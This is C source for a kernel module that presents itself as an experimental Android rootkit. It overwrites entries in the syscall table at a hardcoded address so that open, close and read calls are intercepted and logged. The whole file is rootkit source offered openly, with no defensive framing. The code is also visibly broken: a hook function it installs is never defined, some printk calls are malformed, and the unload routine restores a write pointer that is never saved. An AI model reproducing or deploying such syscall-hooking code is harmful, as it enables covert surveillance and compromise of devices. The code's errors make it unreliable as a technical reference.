/*
	Author: Sebastián Guerrero Selma
	@0xroot - s.guerrero0@gmail.com
	
	2012 (c)

	An experimental Android kernel rootkit.

*/
#include <asm/unistd.h> 
#include <linux/autoconf.h> 
#include <linux/in.h> 
#include <linux/init_task.h> 
#include <linux/ip.h> 
#include <linux/kernel.h> 
#include <linux/kmod.h> 
#include <linux/mm.h> 
#include <linux/module.h> 
#include <linux/sched.h> 
#include <linux/skbuff.h> 
#include <linux/stddef.h> 
#include <linux/string.h> 
#include <linux/syscalls.h> 
#include <linux/tcp.h> 
#include <linux/types.h> 
#include <linux/unistd.h> 
#include <linux/version.h> 
#include <linux/workqueue.h> 


// Pointers to the original system calls
asmlinkage ssize_t (*orig_read) (unsigned int fd, const char *buf, size_t count);
asmlinkage ssize_t (*orig_write) (unsigned int fd, const char *buf, size_t count);
asmlinkage ssize_t (*orig_open) (const char *filename, int flags);
asmlinkage ssize_t (*orig_close) (const char *filename);

// Our hooked system calls

asmlinkage ssize_t open_sysHooked(const char *filename, int flags) {
	printk(KERN_INFO "SYS_HOOKED_OPEN: %s\n", filename);
	return orig_open(filename, flags);
}
asmlinkage ssize_t close_sysHooked(const char *filename) {
	printk(KERN_INFO "SYS_HOOKED_CLOSE: %s\n", current->comm);
	return orig_close(filename);
}
asmlinkage ssize_t write_sysHooked(unsigned int fd, const char *buf, size_t count) {
	printk(KERN_INFO "SYS_HOOKED_WRITE: %s\n", buf);
	return orig_write(fd, buf, count);
}


static int __init whitesnow_start(void) {

	printk(KERN_INFO, "Loading module (( ):;:;:;:;:;:;D \n");
	unsigned long *sys_call_table = 0xc0027004;	// sys_call_table for android-goldfish-2.6.29

	if(sys_call_table != NULL) {
		printk(KERN_INFO, "SYS_CALL_TABLE: %p\n\n", sys_call_table);
		printk(KERN_INFO, "__NR_read: %d\t SYS_CALL_TABLE[__NR_read]: %p\n", __NR_read, sys_call_table[__NR_read]);
		printk(KERN_INFO, "__NR_write: %d\t SYS_CALL_TABLE[__NR_write]: %p\n", __NR_write, sys_call_table[__NR_write]);
		printk(KERN_INFO, "__NR_open: %d\t SYS_CALL_TABLE[__NR_open]: %p\n", __NR_open, sys_call_table[__NR_open]);
		printk(KERN_INFO, "__NR_close: %d\t SYS_CALL_TABLE[__NR_close]: %p\n", __NR_close, sys_call_table[__NR_close]);

		// Read syscall
		orig_read = sys_call_table[__NR_read];
		sys_call_table[__NR_read] = read_sysHooked;

		// Write syscall
		//orig_write = sys_call_table[__NR_write];
		//sys_call_table[__NR_read] = write_sysHooked;

		// Open syscall
		orig_open = sys_call_table[__NR_open];
		sys_call_table[__NR_open] = open_sysHooked;

		// Close syscall
		orig_close = sys_call_table[__NR_close];
		sys_call_table[__NR_close] = close_sysHooked;
	}
	return 0;
}

static void __exit whitesnow_stop(void) {
	// sys_call_table - android-goldfish-2.6.29
	unsigned long *sys_call_table = 0xc0027004;

	if(sys_call_table != NULL) {
		// Clean sys_call_table
		sys_call_table[__NR_open] = orig_open;
		sys_call_table[__NR_close] = orig_close;
		sys_call_table[__NR_read] = orig_read;
		sys_call_table[__NR_write] = orig_write;
	}
}

module_init (whitesnow_start);
module_exit (whitesnow_stop);

